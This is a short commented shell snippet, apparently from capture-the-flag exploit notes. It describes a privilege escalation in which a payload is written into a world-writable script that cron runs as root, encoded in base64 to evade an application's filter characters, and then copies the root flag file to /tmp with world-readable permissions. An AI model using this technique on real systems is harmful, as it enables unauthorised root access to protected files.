# Payload written into /opt/healthcheck.sh
# Root-owned but world-writable (-rwxrwxrwx) script executed by cron as root
# every 10 seconds (via 6 crontab entries). Installed with base64 to avoid the
# app's filter characters:
#   echo IyEv...(b64) > /tmp/b64
#   base64 -d /tmp/b64 > /opt/healthcheck.sh
#
#!/bin/sh
cp /root/root.txt /tmp/rootflag.txt
chmod 666 /tmp/rootflag.txt